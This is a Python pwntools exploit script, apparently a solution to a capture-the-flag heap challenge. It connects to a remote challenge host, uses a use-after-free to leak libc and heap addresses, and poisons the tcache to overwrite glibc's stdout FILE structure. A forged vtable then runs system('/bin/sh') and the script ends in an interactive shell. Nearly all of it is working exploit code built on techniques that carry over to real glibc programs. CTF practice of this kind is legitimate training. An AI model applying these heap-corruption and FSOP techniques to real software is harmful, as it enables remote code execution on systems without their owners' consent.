#!/usr/bin/env python3

from pwn import *
from time import sleep
import random

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

REMOTE_NC_CMD    = "nc chal.amt.rs 1346"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *db_line+222
b db_read
b db_update
b db_menu
c
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    def malloc(idx, key, value, l1, l2):
        r.sendline(b"1")
        r.sendline(bstr(idx))
        r.sendline(bstr(l1))
        r.sendline(bstr(key))
        r.sendline(bstr(l2))
        r.sendline(value)

    def free(idx):
        r.sendline(b"4")
        r.sendline(bstr(idx))

    def view(idx):
        r.sendline(b"3")
        r.sendline(bstr(idx))
    
    def edit(idx, value):
        r.sendline(b"2")
        r.sendline(bstr(idx))
        r.sendline(value)

    #allocating a large bin chunk for libc leak and tcache chunk for heap leak 
    malloc(0, "A"*2000, b"A"*8, 2000, 8)
    free(0)
    view(0)

    r.recvuntil(b"key = ")
    leak = u64(eval(str(r.recvuntil(b"\\x00")).replace("\\\\", "\\")[:-5]+"'").ljust(8, b"\x00"))
    libc.address = leak - (libc.sym.main_arena+96)

    r.recvuntil(b"val = ")
    heap_base = u64(eval(str(r.recvuntil(b"\\x00")).replace("\\\\", "\\")[:-5]+"'").ljust(8, b"\x00"))<<12
    
    malloc(1, "A"*400, b"A"*400, 400, 400)
    malloc(2, "A"*400, b"A"*400, 400, 400)

    free(1)
    free(2)

    target = (libc.sym._IO_2_1_stdout_)^(heap_base+0x7a0>>12)

    #uaf to change next ptr
    edit(2, p64(target))

    def fsrop(): #needed to change vtable offsets for putchar()
        fs = FileStructure()
        fs.flags = 0x3b01010101010101
        fs._IO_read_ptr = u64(b"/bin/sh\0")
        fs._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
        fs._lock = libc.sym["_IO_stdfile_1_lock"]
        fs.vtable = libc.sym["_IO_wstr_jumps"] + 160 - 0x18 + 0x38

        return bytes(fs) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"]+0xe0-0x68)

    #gdb.attach(r, gdbscript=GDB_SCRIPT)

    malloc(5, "A"*400, fsrop(), 400, 400)

    r.interactive()

if __name__ == "__main__":
    main()